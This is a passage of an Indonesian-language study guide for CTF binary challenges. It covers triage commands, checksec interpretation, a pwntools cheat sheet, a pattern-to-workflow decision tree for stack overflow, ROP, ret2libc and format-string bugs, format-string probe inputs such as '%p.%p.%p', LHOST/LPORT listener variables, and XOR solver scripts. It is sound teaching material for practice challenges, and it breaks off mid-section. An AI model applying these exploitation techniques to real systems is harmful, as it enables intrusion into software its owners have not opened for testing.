## 🛡️ Checksec Interpretation

|Protection|OFF|ON|Dampak|
|---|---|---|---|
|NX|Shellcode mungkin|Shellcode stack langsung terhalang|ROP/ret2libc|
|PIE|Binary base relatif tetap|Binary base random|Leak mungkin diperlukan|
|Canary|Stack overwrite lebih mudah|Harus pertimbangkan canary|Leak/bypass|
|RELRO|GOT dapat lebih terbuka|Full RELRO melindungi GOT|GOT overwrite dibatasi|
|ASLR|Address lebih stabil|Address random|Leak/bypass|

---

## 🧠 Pattern → Workflow

|Pattern|Langkah Pertama|Workflow|
|---|---|---|
|`strcmp()`|ltrace|RE-1|
|XOR constant|Ghidra|RE-2|
|XOR modulo|Ghidra|RE-3|
|Reverse loop|Ghidra|RE-4|
|Hash|Identify algorithm|RE-5|
|Custom alphabet|Extract lookup table|RE-6|
|`ptrace()`|Compare GDB vs normal|RE-7|
|UPX|Unpack copy|RE-8|
|Stripped|Find main/entry|RE-9|
|Multiple decrypt|Map stages|RE-10|
|`win()`|Offset → RIP|PWN-1|
|`gets()`|Offset|PWN-2|
|NX OFF|Shellcode|PWN-3|
|NX ON|Leak/libc|PWN-4|
|Gadgets|ROP|PWN-5|
|`printf(input)`|Stack leak|PWN-6|
|`%n`|Controlled write|PWN-7|
|PIE + leak|Calculate base|PWN-8|
|malloc/free stale ptr|Heap analysis|PWN-9|
|libc + one_gadget|Check constraints|PWN-10|

---

## 🧰 Pwntools One-Liners Penting

```python
# Load ELF.
elf = ELF("./challenge")

# Jalankan process.
io = process("./challenge")

# Remote connection.
io = remote("example.com", 1337)

# Pack 64-bit little-endian.
p64(0x401196)

# Pack 32-bit.
p32(0x08049196)

# Generate cyclic pattern.
cyclic(200)

# Find offset.
cyclic_find(0x6161616a)

# Build ROP.
rop = ROP(elf)

# Create flat payload.
flat(b"A" * 40, 0x401196)

# Send line.
io.sendline(b"AAAA")

# Wait for prompt.
io.sendlineafter(b"> ", b"AAAA")

# Receive until marker.
io.recvuntil(b"FLAG:")

# Interactive shell/session.
io.interactive()
```

---

## 🐛 GDB Commands Terpenting

```text
break main
run
continue
next
step
finish
info registers
x/20gx $rsp
x/20gx $rbp
x/s ADDRESS
disassemble main
info functions
info proc mappings
```

Mental shortcut:

```text
break  → stop
run    → start
next   → next line/instruction
step   → enter function
finish → finish current function
x      → examine memory
info   → inspect state
```

---

# 🔢 9.2 Konversi Ukuran yang Sering Dipakai

## `p32()` vs `p64()`

```python
#!/usr/bin/env python3

from pwn import *

# 32-bit address menggunakan 4 byte.
address32 = p32(0x08049196)

# 64-bit address menggunakan 8 byte.
address64 = p64(0x401196)

print(address32)
print(address64)
```

Rule:

```text
32-bit → p32()
64-bit → p64()
```

---

## Little-Endian vs Big-Endian

Misal:

```text
0x401196
```

Dalam little-endian 64-bit:

```text
96 11 40 00 00 00 00 00
```

Python:

```python
#!/usr/bin/env python3

from struct import pack

# Pack integer dalam little-endian 64-bit.
packed = pack("<Q", 0x401196)

print(packed.hex())
```

---

## Membaca Address dari GDB

Misalnya:

```text
0x00007fffffffe2a0
```

Interpretasi:

```text
64-bit address
↓
stack region kemungkinan
```

Tetapi address range **tidak cukup untuk menentukan fungsi/objek secara pasti**.

Gunakan mapping:

```text
info proc mappings
```

---

## Hex ke Integer Python

```python
#!/usr/bin/env python3

# Konversi hexadecimal string menjadi integer.
value = int("0x401196", 16)

print(value)

# Kembali ke hex.
print(hex(value))
```

---

# 🏆 BAGIAN 10 — GOLDEN RULES BINARY CTF

## 🥇 Rule 1 — Selalu Jalankan Triage 5 Menit Dulu

Jangan langsung exploit.

Lakukan:

```text
file
↓
checksec
↓
strings
↓
ltrace
↓
input surface
```

---

## 🥈 Rule 2 — Jangan Langsung Buka Ghidra Sebelum Quick Dynamic Triage

Untuk binary dynamically linked, `ltrace` dapat memberikan shortcut sangat besar.

Tetapi aturan ini bukan absolut.

Jika:

```text
static binary
atau
ltrace tidak informatif
```

langsung berpindah ke:

```text
Ghidra
objdump
readelf
GDB
```

---

## 🥉 Rule 3 — Checksec adalah Peta Jalan, Bukan Hambatan

Jangan melihat:

```text
NX ON
PIE ON
Canary ON
```

sebagai:

> "Tidak bisa dieksploit."

Lebih tepat:

```text
Protection
   ↓
Apa teknik yang terpengaruh?
   ↓
Primitive alternatif apa?
```

---

## 4️⃣ Rule 4 — Offset Benar Tidak Menjamin Exploit Benar

Pisahkan diagnosis:

```text
OFFSET
ALIGNMENT
ADDRESS
LIBC
MITIGATION
```

---

## 5️⃣ Rule 5 — Stack Alignment 16-Byte Harus Selalu Diingat

Pada x86-64 System V ABI, alignment stack penting ketika masuk ke function tertentu.

Gejala umum:

```text
RIP benar
system benar
/bin/sh benar
tetapi crash
```

Periksa:

```text
ret gadget
stack alignment
```

---

## 6️⃣ Rule 6 — Backup Binary Sebelum Patch

```bash
# Simpan backup binary.
cp ./challenge ./challenge.backup
```

Jangan patch binary asli tanpa alasan.

---

## 7️⃣ Rule 7 — Test Payload Local Sebelum Remote

Urutan:

```text
Local
 ↓
Debug
 ↓
Stabil
 ↓
Remote
```

Jangan menjadikan remote sebagai debugger pertama.

---

## 8️⃣ Rule 8 — Baca Error Message dengan Seksama

Error:

```text
EOF
```

bukan diagnosis.

Tanyakan:

```text
Mengapa process EOF?

Crash?
Exit normal?
Prompt salah?
Payload malformed?
```

---

## 9️⃣ Rule 9 — Libc Leak Sering Membutuhkan Dua Tahap

Mental model klasik:

```text
STAGE 1
Leak
 ↓
libc base

STAGE 2
libc base
 ↓
system
 ↓
shell
```

Tetapi tidak semua challenge membutuhkan pola dua tahap literal; beberapa menyediakan leak yang sudah tersedia atau primitive lain.

---

## 🔟 Rule 10 — Jangan Menganggap Address dari Satu Run Selalu Valid

ASLR/PIE dapat mengubah address.

Bandingkan:

```text
Run 1
Run 2
Run 3
```

Jika base berubah, Anda memerlukan strategi leak/calculation.

---

## 1️⃣1️⃣ Rule 11 — Jangan Menganggap `ltrace` Selalu Memberi Jawaban

`ltrace` sangat bagus untuk dynamic library calls.

Tetapi:

```text
static linking
stripped internals
anti-debug
custom implementation
```

dapat membuat informasi tidak lengkap.

---

## 1️⃣2️⃣ Rule 12 — Jangan Menganggap Checksec OFF = Auto Win

Contoh:

```text
NX OFF
```

tidak berarti:

```text
shellcode otomatis berhasil
```

Masih perlu:

```text
input control
offset
address
control flow
```

---

## 1️⃣3️⃣ Rule 13 — Identifikasi Primitive Sebelum Memilih Payload

Gunakan urutan:

```text
What can I control?
        ↓
Can I read?
        ↓
Can I write?
        ↓
Can I control RIP?
        ↓
Can I execute?
        ↓
Choose technique
```

---

## 1️⃣4️⃣ Rule 14 — Selesaikan Masalah Satu Layer Sekaligus

Jangan debug sekaligus:

```text
offset
ROP
libc
remote
```

Gunakan:

```text
1. Offset
2. RIP control
3. Leak
4. Base
5. Final primitive
6. Shell
```

---

## 1️⃣5️⃣ Rule 15 — Pattern Recognition Mengalahkan Hafalan Random

Target akhir bukan:

```text
"Hafal 100 exploit."
```

Target:

```text
"Melihat signal → langsung tahu workflow."
```

---

# 🔗 BAGIAN 11 — CROSS-WORKFLOW

## 📘 ← File 48 — Binary Analysis

**Peran:**

Fondasi untuk mengetahui:

```text
architecture
format
sections
symbols
protections
imports
exports
```

Link:

← [**File 48: Binary Analysis**](https://arena.ai/c/[🔬 48 — Binary Analysis Workflow](/docs/binary-analysis))

---

## 💥 ← File 49 — Buffer Overflow

**Peran:**

Mendalami:

```text
stack overflow
offset
EIP/RIP overwrite
ret2win
ret2libc
shellcode
format string
```

Link:

← [**File 49: Buffer Overflow**](https://arena.ai/c/[💥 49 — Buffer Overflow Workflow](/docs/buffer-overflow))

---

## 🧱 ← File 50 — ROP Chain

**Peran:**

Mendalami:

```text
gadget discovery
ROP chain
register control
syscall
ret2csu
stack pivot
PIE/ASLR
```

Link:

← [**File 50: ROP Chain**](https://arena.ai/c/[🔗 50 — ROP Chain Workflow](/docs/rop-chain))

---

## 🧠 ← File 51 — Reverse Engineering

**Peran:**

Mendalami:

```text
Ghidra
decompiler
functions
control flow
XOR
hash
encoding
anti-debug
packed binary
stripped binary
```

Link:

← [**File 51: RE**](https://arena.ai/c/[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering))

---

## 🧩 File 52 — CTF Binary Patterns

File ini berada di atas workflow sebelumnya:

```text
                 FILE 52
             Pattern Recognition
                    │
        ┌───────────┴───────────┐
        │                       │
       RE                      PWN
        │                       │
        v                       v
      File 51              File 49 / 50
```

Fungsi File 52:

```text
Challenge
    ↓
Triage
    ↓
Signal Detection
    ↓
Pattern Recognition
    ↓
Workflow Selection
    ↓
Technique
    ↓
Solver
    ↓
FLAG
```

---

## 🧪 → File 53 — Crypto Identification

Binary RE kadang menemukan:

```text
custom encoding
hash
XOR
substitution
bitwise transformation
custom alphabet
```

Tetapi jangan selalu menganggap:

```text
XOR = Crypto challenge
```

Sering kali XOR hanyalah bagian dari logic program.

File 53 berguna ketika hasil reverse engineering menunjukkan primitive kriptografi/encoding yang menjadi masalah utama.

→ [**File 53: Crypto**](https://arena.ai/c/<a href="/docs/crypto-identification" class="text-[#00b4d8] hover:underline font-mono font-semibold">53_crypto_identification_workflow.md</a>)

---

# 🧠 MASTER BINARY CTF DECISION TREE

Gunakan diagram berikut sebagai **mental shortcut utama**:

```text
                      ┌──────────────────────┐
                      │   BINARY CHALLENGE   │
                      └───────────┬──────────┘
                                  │
                                  v
                     ┌────────────────────────┐
                     │ 5-MINUTE TRIAGE        │
                     │ file + checksec        │
                     │ strings + ltrace       │
                     └────────────┬───────────┘
                                  │
                                  v
                     ┌────────────────────────┐
                     │ RE atau PWN?            │
                     └───────┬─────────┬──────┘
                             │         │
                       RE    │         │    PWN
                             │         │
             ┌───────────────┘         └────────────────┐
             │                                          │
             v                                          v
       strcmp/memcmp?                            Input sink?
             │                                          │
             v                                  ┌───────┴────────┐
           RE-1                                  │                │
                                                v                v
                                             gets/read        printf(input)
                                                │                │
                                                v                v
                                             Stack BOF          FSB
                                                │                │
                              ┌─────────────────┼────────┐       ├── read
                              │                 │        │       │
                              v                 v        v       └── write
                           win()?            NX OFF    NX ON
                              │                 │        │
                              v                 v        v
                           PWN-1             PWN-3    ROP/ret2libc
                                                       │
                                                ┌──────┴──────┐
                                                │             │
                                                v             v
                                             libc leak     PIE leak
                                                │             │
                                                v             v
                                              PWN-4         PWN-8
                                                │
                                                v
                                              PWN-5
                                                │
                                                v
                                              PWN-10
```

---

# 🚀 60-SECOND BINARY DECISION CARD

Saat CTF dimulai dan Anda panik, baca ini:

```text
========================================================
BINARY CTF 60-SECOND CARD
========================================================

1. file
   └─ 32 / 64?
   └─ stripped?

2. checksec
   └─ NX?
   └─ PIE?
   └─ Canary?
   └─ RELRO?

3. strings
   └─ flag?
   └─ win?
   └─ password?
   └─ UPX?

4. ltrace
   └─ strcmp?
   └─ memcmp?
   └─ ptrace?

5. Input sink
   └─ gets/read/strcpy?
   └─ printf(input)?
   └─ malloc/free?

6. CHOOSE:

   strcmp/memcmp
      → RE-1

   XOR
      → RE-2 / RE-3

   reverse
      → RE-4

   hash
      → RE-5

   custom table
      → RE-6

   ptrace
      → RE-7

   UPX
      → RE-8

   stripped
      → RE-9

   multi-stage
      → RE-10

   win()
      → PWN-1

   stack overflow
      → PWN-2

   NX OFF
      → PWN-3 candidate

   NX ON
      → PWN-4 / PWN-5

   printf(input)
      → PWN-6 / PWN-7

   PIE + leak
      → PWN-8

   UAF
      → PWN-9

   libc + one_gadget
      → PWN-10
========================================================
```

---

# 🧠 MASTER MINDSET

Jangan lagi melihat binary sebagai:

```text
"Program yang harus saya bongkar semuanya."
```

Lihat sebagai:

```text
Sinyal
  ↓
Pattern
  ↓
Primitive
  ↓
Technique
  ↓
Workflow
  ↓
Flag
```

Contoh akhir:

```text
gets()
   +
Canary OFF
   +
NX ON
   +
win() tidak dipanggil
        ↓
Stack Overflow
        ↓
RIP Control
        ↓
ret2win
        ↓
FLAG
```

Atau:

```text
printf(user_input)
        +
PIE ON
        +
libc pointer leak
        ↓
Format String Read
        ↓
PIE/libc Base
        ↓
ROP
        ↓
ret2libc
        ↓
FLAG
```

Atau:

```text
ptrace()
   +
GDB menyebabkan exit
   ↓
Anti-Debug
   ↓
RE
   ↓
Bypass/check logic
   ↓
Continue analysis
   ↓
FLAG
```

---

# ✅ FINAL CHECKLIST — FILE 52

Sebelum menganggap File 52 selesai dipelajari:

```text
[ ] Saya tahu apa itu Binary Pattern Recognition.
[ ] Saya bisa melakukan triage binary dalam ±5 menit.
[ ] Saya bisa membaca output file.
[ ] Saya bisa membaca checksec.
[ ] Saya bisa mengenali stripped binary.
[ ] Saya bisa mengenali UPX.
[ ] Saya bisa mengenali strcmp/memcmp.
[ ] Saya bisa mengenali XOR.
[ ] Saya bisa mengenali hash verification.
[ ] Saya bisa mengenali anti-debug.
[ ] Saya bisa mengenali stack overflow.
[ ] Saya bisa mengenali ret2win.
[ ] Saya bisa membedakan NX ON vs OFF.
[ ] Saya tahu kapan shellcode relevan.
[ ] Saya tahu kapan ret2libc relevan.
[ ] Saya tahu kapan ROP relevan.
[ ] Saya tahu bagaimana format string digunakan sebagai read primitive.
[ ] Saya tahu bagaimana format string bisa menjadi write primitive.
[ ] Saya memahami PIE + ASLR leak.
[ ] Saya memahami dasar UAF.
[ ] Saya memahami one-gadget dan constraints.
[ ] Saya tahu cara mencari offset menggunakan cyclic.
[ ] Saya memahami stack alignment.
[ ] Saya bisa membedakan offset error vs alignment error.
[ ] Saya bisa membedakan libc mismatch vs payload error.
[ ] Saya memiliki template pwntools sendiri.
[ ] Saya dapat berpindah dari Pattern → Workflow tanpa mencari-cari ulang.
```

---

# 🏁 FINAL PRINCIPLE

```text
                    BINARY CTF MASTERY

                         ┌───────┐
                         │ INPUT │
                         └───┬───┘
                             │
                             v
                       ┌───────────┐
                       │  TRIAGE   │
                       └─────┬─────┘
                             │
                             v
                      ┌─────────────┐
                      │   PATTERN   │
                      │ RE / PWN    │
                      └──────┬──────┘
                             │
                             v
                       ┌──────────┐
                       │ PRIMITIVE│
                       └─────┬────┘
                             │
                             v
                       ┌──────────┐
                       │ TECHNIQUE│
                       └─────┬────┘
                             │
                             v
                       ┌──────────┐
                       │ WORKFLOW │
                       └─────┬────┘
                             │
                             v
                       ┌──────────┐
                       │ PAYLOAD  │
                       └─────┬────┘
                             │
                             v
                       ┌──────────┐
                       │   FLAG   │
                       └──────────┘
```

> **Tujuan akhir File 52 bukan membuatmu hafal 20 pola.**
> 
> Tujuannya adalah membuat otakmu bereaksi seperti:
> 
> **"Saya melihat signal ini → berarti kemungkinan besar pattern ini → saya tahu workflow mana yang harus dibuka."**

---

# [🧩 File 52 — CTF Binary Patterns](/docs/ctf-binary-patterns)

## CTF Binary Patterns — Interactive Decision & Rapid Triage Guide

> **Cara baca dokumen ini:** Ini bukan workflow teknis biasa. Ini adalah **lapisan pengambilan keputusan** di atas File 48-51. Gunakan ini pertama kali saat dapat binary challenge, tentukan pattern-nya, lalu masuk ke workflow yang tepat.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Setup folder kerja untuk binary CTF
export BINARY="./challenge"        # Ganti sesuai nama binary
export LHOST="10.10.14.5"         # IP kamu
export LPORT="4444"
mkdir -p ~/binary_ctf/{loot,solvers,dumps,patched}
cd ~/binary_ctf

# Copy binary untuk preserve original
cp $BINARY ./original_backup
chmod +x $BINARY

echo "[*] Binary: $BINARY"
echo "[*] Working dir: $(pwd)"
```

---

## ═══════════════════════════════════════

## FASE 0: TRIAGE 5 MENIT (WAJIB PERTAMA)

## ═══════════════════════════════════════

> **ATURAN EMAS:** Jangan buka Ghidra atau GDB sebelum triage selesai. 5 menit ini bisa langsung kasih jawaban atau arahkan ke jalur yang tepat.

### Langkah 0.1 — `file` + `checksec` (30 detik)

Bash

```
# Command 1: Identifikasi format binary
file $BINARY

# Command 2: Cek semua proteksi sekaligus
checksec $BINARY
# atau:
checksec --file=$BINARY
```

**OUTPUT `file` — Cara baca:**

|Output|Arti|Tindakan|
|---|---|---|
|`ELF 64-bit LSB pie executable`|64-bit, PIE aktif|Alamat Ghidra ≠ GDB runtime|
|`ELF 32-bit LSB executable`|32-bit, tanpa PIE|Alamat fix, konvensi arg via stack|
|`dynamically linked`|ltrace bisa dipakai|Coba ltrace dulu sebelum Ghidra|
|`statically linked`|ltrace tidak berguna|Langsung ke Ghidra|
|`not stripped`|Simbol ada|Nama fungsi tersedia di Ghidra|
|`stripped`|Simbol dihapus|Harus cari main manual via `_start`|

**OUTPUT `checksec` — Cara baca dan implikasi:**

text

```
[*] '/root/binary_ctf/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

|Proteksi|OFF|ON|Implikasi ke Teknik|
|---|---|---|---|
|`NX: NX disabled`|✅|-|Shellcode di stack bisa jalan → PWN-3|
|`NX: NX enabled`|-|✅|Shellcode di stack tidak bisa → ROP/ret2libc|
|`PIE: No PIE`|✅|-|Alamat Ghidra = GDB, langsung pakai|
|`PIE: PIE enabled`|-|✅|Alamat random, butuh leak dulu|
|`Stack: No canary`|✅|-|Stack overflow lebih mudah|
|`Stack: Canary found`|-|✅|Harus bypass/leak canary dulu|
|`RELRO: No RELRO`|✅|-|GOT writeable, bisa overwrite|
|`RELRO: Full RELRO`|-|✅|GOT read-only, GOT overwrite tidak bisa|

Bash

```
# Simpan hasil ke file
file $BINARY > ~/binary_ctf/loot/triage.txt
checksec $BINARY >> ~/binary_ctf/loot/triage.txt
cat ~/binary_ctf/loot/triage.txt
```

**OUTPUT GAGAL ❌ — checksec tidak ada:**

text

```
checksec: command not found
```

Bash

```
# Install
sudo apt install checksec -y
# atau
pip3 install checksec.py
# atau pakai readelf manual:
readelf -l $BINARY | grep -E "GNU_STACK|EXEC"
```

---

### Langkah 0.2 — `strings` Hunt (1 menit)

Bash

```
# Command 1: Cari keyword kritis langsung
strings $BINARY | grep -Ei "flag|win|shell|pass|key|correct|wrong|secret|ctf\{|htb\{"

# Command 2: Cari tanda packer
strings $BINARY | grep -Ei "upx|packed|compress"

# Command 3: Cari format string berbahaya (hint FSB)
strings $BINARY | grep -E "%[0-9\$]*[pxsn]"

# Command 4: Simpan semua strings untuk analisis lambat
strings -n 6 $BINARY > ~/binary_ctf/loot/all_strings.txt
wc -l ~/binary_ctf/loot/all_strings.txt
```

**OUTPUT BERHASIL ✅ — Flag langsung ketemu:**

text

```
FLAG{s1mpl3_str1ngs_ch3ck}
Correct password!
```

➡️ **SELESAI!** Submit flag. Tidak perlu lanjut.

**OUTPUT BERHASIL ✅ — Ada `win` / `get_flag` / `shell`:**

text

```
win
get_flag
/bin/sh
```

➡️ **PWN Pattern!** Ada fungsi win() yang tidak dipanggil. Ini pola **PWN-1 (ret2win)**. Lanjut ke Langkah 0.3 untuk konfirmasi.

**OUTPUT BERHASIL ✅ — Ada UPX:**

text

```
$Info: This file is packed with the UPX executable packer
UPX!
```

➡️ **Binary ter-pack!** Langsung ke **Langkah 0.5 (Unpack)** sebelum analisis lebih lanjut.

**OUTPUT BERHASIL ✅ — Ada format specifier mencurigakan:**

text

```
%p.%p.%p
%s.%s
```

➡️ Hint Format String Bug. Catat, lanjut ke Langkah 0.3.

**OUTPUT GAGAL ❌ — Strings tidak informatif (banyak noise):**

text

```
[ribuan baris library functions]
```

➡️ Normal. Lanjut ke `ltrace`.

---

### Langkah 0.3 — `ltrace` + `strace` (1 menit)

Bash

```
# Command 1: Dynamic library trace dengan input test
ltrace $BINARY <<< "AAAA" 2>&1

# Command 2: Filter fungsi perbandingan yang paling penting
ltrace -e strcmp,strncmp,memcmp,strcasecmp $BINARY <<< "TEST_INPUT" 2>&1

# Command 3: Syscall trace untuk lihat behavior kernel
strace -e trace=read,write,openat,access $BINARY <<< "AAAA" 2>&1 | head -20

# Simpan output
ltrace $BINARY <<< "AAAA" 2>&1 | tee ~/binary_ctf/loot/ltrace_output.txt
```

**OUTPUT BERHASIL ✅ — strcmp membocorkan password (RE Pattern!):**

text

```
strcmp("AAAA\n", "s3cr3t_p4ssw0rd!\n") = -18
puts("Wrong password!")
```

**Cara baca:**

- Argumen 1 = input kita (`"AAAA"`)
- Argumen 2 = **PASSWORD YANG BENAR** (`"s3cr3t_p4ssw0rd!"`)
- Return non-zero = berbeda (salah)

Bash

```
# Verifikasi langsung
echo "s3cr3t_p4ssw0rd!" | $BINARY
```

**OUTPUT BERHASIL ✅ — memcmp (tidak tampilkan string):**

text

```
memcmp(0x7fffffffe1a0, 0x555555558020, 16) = -1
```

➡️ Perlu GDB untuk dump alamat `0x555555558020`. Lanjut ke **Fase 2 (GDB Dynamic Analysis)**.

**OUTPUT BERHASIL ✅ — ptrace anti-debug:**

text

```
ptrace(PTRACE_TRACEME, 0, 0x1, 0)    = -1
puts("Debugger detected!")
```

➡️ **RE-7 Pattern (Anti-Debug)**. Perlu bypass ptrace. Lanjut ke Langkah 0.4 → Ghidra untuk identifikasi lokasi check.

**OUTPUT BERHASIL ✅ — Binary baca file:**

text

```
openat(AT_FDCWD, "flag.txt", O_RDONLY) = -1 ENOENT
```

Bash

```
# Buat file placeholder
echo "CTF{test_flag_here}" > flag.txt
$BINARY
```

**OUTPUT GAGAL ❌ — ltrace kosong / program langsung exit:**

text

```
+++ exited with status 1 +++
```

Kemungkinan:

1. Binary statically linked → ltrace tidak bekerja
2. Anti-debug aktif
3. Binary butuh argumen tertentu

Bash

```
# Cek linking
file $BINARY | grep -o "statically linked\|dynamically linked"

# Coba dengan argumen
$BINARY --help 2>&1 | head -5
$BINARY test 2>&1

# Jika statically linked → langsung ke Ghidra
```

---

### Langkah 0.4 — Vulnerability Surface Scan (2 menit)

Bash

```
# Command 1: Cari input sink yang vulnerable
objdump -d $BINARY | grep -E "gets|strcpy|scanf|read|printf|sprintf" | head -20

# Command 2: Cari simbol fungsi menarik (untuk not stripped)
nm $BINARY 2>/dev/null | grep -Ei "win|flag|shell|main|auth|check|vuln"

# Command 3: Cari gadget ROP awal (untuk konfirmasi PWN pattern)
ROPgadget --binary $BINARY | grep "pop rdi" | head -3

# Command 4: Cek apakah ada malloc/free (heap pattern)
nm $BINARY 2>/dev/null | grep -E "malloc|free|calloc"
objdump -d $BINARY | grep -E "malloc|free" | head -5
```

**OUTPUT BERHASIL ✅ — Ada gets() / strcpy():**

text

```
401080: call   401050 <gets@plt>
```

➡️ **Stack Buffer Overflow!** Ini **PWN-2 pattern**. Cek NX status dari checksec:

- NX OFF → **PWN-3 (shellcode)**
- NX ON + ada win() → **PWN-1 (ret2win)**
- NX ON + tidak ada win() → **PWN-4/PWN-5 (ret2libc/ROP)**

**OUTPUT BERHASIL ✅ — Ada printf tanpa format string:**

text

```
401196: call   401040 <printf@plt>
```

Bash

```
# Verifikasi: apakah input user langsung masuk ke printf?
# Test cepat
echo "%p.%p.%p" | $BINARY 2>&1
# Jika output ada 0x... → FSB confirmed!
```

**OUTPUT BERHASIL ✅ — Ada win() di simbol:**

text

```
0000000000401196 T win
0000000000401149 T main
```

➡️ Catat alamat win:

Bash

```
export WIN_ADDR=0x401196
echo "WIN function at: $WIN_ADDR"
```

---

### Langkah 0.5 — Unpack Binary (Jika UPX/Packed)

Bash

```
# Test UPX
upx -t $BINARY

# Backup original DULU
cp $BINARY ${BINARY}.upx_backup

# Unpack
upx -d $BINARY -o ./challenge_unpacked

# Verifikasi
file ./challenge_unpacked
strings ./challenge_unpacked | grep -Ei "flag|pass|win"

# Update target
export BINARY="./challenge_unpacked"
```

**OUTPUT BERHASIL ✅ — Berhasil unpack:**

text

```
upx: ./challenge: unpacked 1 file
```

➡️ Kembali ke **Langkah 0.2** dengan binary yang sudah di-unpack.

**OUTPUT GAGAL ❌ — Header corrupted / custom packer:**

text

```
upx: challenge: UnpackingException: header corrupted
```

Bash

```
# Deteksi packer dengan DIE
sudo apt install detect-it-easy -y
die $BINARY

# Cek entropy (packed = entropy tinggi)
python3 -c "
import math, collections
data = open('$BINARY','rb').read()
freq = collections.Counter(data)
entropy = -sum((f/len(data))*math.log2(f/len(data)) for f in freq.values())
print(f'Entropy: {entropy:.2f}/8.0')
print('Likely packed:' if entropy > 7.0 else 'Probably not packed:',entropy > 7.0)
"

# Jika custom packer, unpack via GDB memory dump:
gdb -q $BINARY
(gdb) starti          # Stop di instruksi pertama
(gdb) vmmap           # Lihat memory layout
(gdb) continue        # Biarkan unpacking stub jalan
# Saat pause/break:
(gdb) dump binary memory ./unpacked_dump.bin 0x400000 0x500000
```

---

### Langkah 0.6 — Decision Point: Tentukan Pattern

Setelah triage, isi checklist ini:

text

```
CHECKLIST TRIAGE:
[ ] Architecture: 32-bit / 64-bit
[ ] PIE: ON / OFF
[ ] NX: ON / OFF
[ ] Canary: ON / OFF
[ ] RELRO: No / Partial / Full
[ ] Stripped: YES / NO
[ ] Dynamically linked: YES / NO
[ ] UPX/Packed: YES / NO

FINDINGS:
[ ] Flag ketemu di strings → SELESAI, submit
[ ] strcmp/memcmp bocor di ltrace → Password ketemu, coba
[ ] Ada fungsi win() → PWN-1 pattern
[ ] Ada gets/strcpy → Stack BOF pattern
[ ] Ada printf(input) → FSB pattern
[ ] Ada malloc/free + use-after-free → Heap pattern
[ ] Ada ptrace anti-debug → RE-7 pattern
[ ] Ada XOR loop di Ghidra → RE-2/RE-3 pattern
[ ] Binary statically linked → Ghidra only, ltrace skip
```

---

## ═══════════════════════════════════════

## FASE 1: PATTERN IDENTIFICATION & WORKFLOW SELECTION

## ═══════════════════════════════════════

> Berdasarkan hasil triage, pilih pattern yang cocok dan ikuti workflow-nya.

### Pattern RE-1: Hardcoded String Comparison

**Trigger:**

- `ltrace` menampilkan `strcmp(input, "target")`
- Ada string "Correct" / "Wrong" di strings output
- Binary dynamically linked

Bash

```
# Konfirmasi pattern
ltrace $BINARY <<< "test" 2>&1 | grep -E "strcmp|strncmp|memcmp"
```

**OUTPUT BERHASIL ✅:**

text

```
strcmp("test\n", "CTF{h4rdc0d3d_flag}\n") = 1
```

Bash

```
# Solve langsung
echo -n "CTF{h4rdc0d3d_flag}" | $BINARY
# atau
echo "CTF{h4rdc0d3d_flag}" | $BINARY
```

**OUTPUT BERHASIL ✅ — Program output "Correct":**

text

```
Correct! You got it!
```

➡️ Flag adalah `CTF{h4rdc0d3d_flag}`. **SELESAI.**

**OUTPUT GAGAL ❌ — Program masih "Wrong" meski password benar:**

text

```
Wrong password!
```

Kemungkinan:

1. Ada `\n` di perbandingan → coba tanpa newline: `printf "password" | $BINARY`
2. Perbandingan lebih kompleks → perlu Ghidra untuk lihat logika
3. Multi-stage validation → lanjut ke Fase 2 (Ghidra)

**Google jika buntu:**

text

```
"ctf strcmp bypass <binary_name>"
"ltrace strcmp first argument second argument"
```

---

### Pattern RE-2: Single-Byte XOR

**Trigger:**

- Di Ghidra: loop dengan operator `^` constant
- `input[i] ^ 0x42 == CIPHER_ARRAY[i]`

Bash

```
# Identifikasi di assembly dulu
objdump -d $BINARY | grep "xor" | head -10

# Atau di Ghidra: cari loop dengan ^ operator
```

**OUTPUT BERHASIL ✅ — Ghidra menampilkan:**

C

```
while (i < 16) {
    if ((user_input[i] ^ 0x4f) != cipher_array[i]) {
        puts("Wrong!");
        return;
    }
    i++;
}
```

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/xor_re2_solver.py

# ISI INI DARI GHIDRA (Copy Special → Byte String dari cipher_array)
CIPHER_HEX = "09 0b 19 20 3a 1b 73 30 70 20 70 3f 7b 3b 70 3c"
XOR_KEY = 0x4f    # Dari decompiler

cipher = bytes(int(x, 16) for x in CIPHER_HEX.split())
flag = bytes([b ^ XOR_KEY for b in cipher])
print(f"[+] FLAG: {flag.decode('ascii', errors='replace')}")
```

Bash

```
python3 ~/binary_ctf/solvers/xor_re2_solver.py
```

**OUTPUT BERHASIL ✅:**

text

```
[+] FLAG: FLAG{x0r_s0lv3d}
```

**OUTPUT GAGAL ❌ — Output non-ASCII:**

text

```
[+] FLAG: \x01\xff\x32...
```

➡️ Key salah. Brute-force:

Python

```
cipher = bytes(int(x, 16) for x in CIPHER_HEX.split())
for key in range(256):
    result = bytes([b ^ key for b in cipher])
    if all(32 <= c < 127 for c in result):
        if b'CTF' in result or b'FLAG' in result or b'HTB' in result:
            print(f"Key 0x{key:02x}: {result.decode()}")
```

---

### Pattern RE-3: Multi-Byte Repeating XOR

**Trigger:**

- Di Ghidra: `input[i] ^ key[i % key_len]`
- Ada array key yang lebih dari 1 byte

Bash

```
# Cek modulo operation di assembly
objdump -d $BINARY | grep -E "div|idiv|mod" | head -5
```

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/xor_re3_solver.py

CIPHER_HEX = "071d000f0b1a"  # Dari Ghidra
KEY = b"KEY"                  # Dari Ghidra (cari di strings output atau .rodata)

cipher = bytes.fromhex(CIPHER_HEX)
result = bytes([cipher[i] ^ KEY[i % len(KEY)] for i in range(len(cipher))])
print(f"[+] Decoded: {result.decode('ascii', errors='replace')}")
```

**Jika KEY tidak diketahui:**

Python

```
# Brute-force key 1-4 byte dari printable ASCII
import itertools, string

cipher = bytes.fromhex(CIPHER_HEX)
printable = string.printable.encode()

# Coba key 1 byte dulu
for k in range(256):
    result = bytes([b ^ k for b in cipher])
    if all(32 <= c < 127 for c in result):
        print(f"1-byte key 0x{k:02x}: {result.decode()}")
```

---

### Pattern RE-4: Hash Verification

**Trigger:**

- `strings` output: `md5`, `sha1`, `sha256`, `sha512`
- `ltrace` tidak menampilkan string plaintext
- Di Ghidra: fungsi hash + `memcmp` ke digest buffer

Bash

```
# Cari import hash functions
strings $BINARY | grep -Ei "md5|sha1|sha256|sha512|crc32"
